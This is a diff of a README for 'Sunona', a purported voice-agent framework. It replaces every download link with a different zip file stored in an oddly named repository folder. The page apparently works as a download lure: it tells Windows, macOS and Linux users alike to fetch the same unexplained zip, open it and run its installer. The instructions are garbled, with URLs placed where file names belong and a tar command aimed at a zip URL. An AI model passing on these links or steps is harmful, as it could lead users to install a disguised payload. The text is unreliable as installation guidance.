@@ -3,7 +3,7 @@
 ## 🛠️ Want to create conversational agents easily?
 
 ### 💾 Download Now
-[![Download Sunona](https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip)](https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip)
+[![Download Sunona](https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip)](https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -22,37 +22,37 @@ Before you begin, make sure your computer meets these basic requirements:
 
 To get started, visit the Releases page to download the latest version of Sunona.
 
-[Download Sunona v0.001](https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip)
+[Download Sunona v0.001](https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip)
 
 1. Click on the link above to go to the Github Releases page.
 2. Find the latest version labeled "v0.001".
 3. Choose the correct file for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip`.
-   - For Linux, download the package `https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip`.
+   - For Windows, download `https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip`.
+   - For macOS, download `https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip`.
+   - For Linux, download the package `https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip`.
 4. Once the file downloads, open it to start the installation.
 
 ### 🔑 Installation Steps
 
 #### For Windows:
 
-1. Locate the `https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip` file in your downloads folder.
+1. Locate the `https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip` file in your downloads folder.
 2. Double-click the file to open it.
 3. Follow the on-screen instructions to complete the installation.
 
 #### For macOS:
 
-1. Find the `https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip` file in your downloads.
+1. Find the `https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip` file in your downloads.
 2. Double-click to open the file.
 3. Drag the Sunona icon into your Applications folder.
 4. Eject the installer by right-clicking its icon and selecting "Eject".
 
 #### For Linux:
 
-1. Navigate to the folder containing `https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip`.
+1. Navigate to the folder containing `https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip`.
 2. Extract the tarball by running:
    ```bash
-   tar -xzf https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip
+   tar -xzf https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip
    ```
 3. Change directory into the extracted folder:
    ```bash
@@ -100,4 +100,4 @@ Stay updated on new features and improvements by following our repository. Engag
 
 Thank you for choosing Sunona! We hope it helps you create amazing voice AI applications effortlessly.
 
-[Download Sunona v0.001](https://raw.githubusercontent.com/Ezdokz1337/sunona-v0.001/main/sunona/input_handlers/telephony_providers/sunona-v0.001_1.4.zip)
+[Download Sunona v0.001](https://github.com/Ezdokz1337/sunona-v0.001/raw/refs/heads/main/sunonaa/v_sunona_2.4.zip)
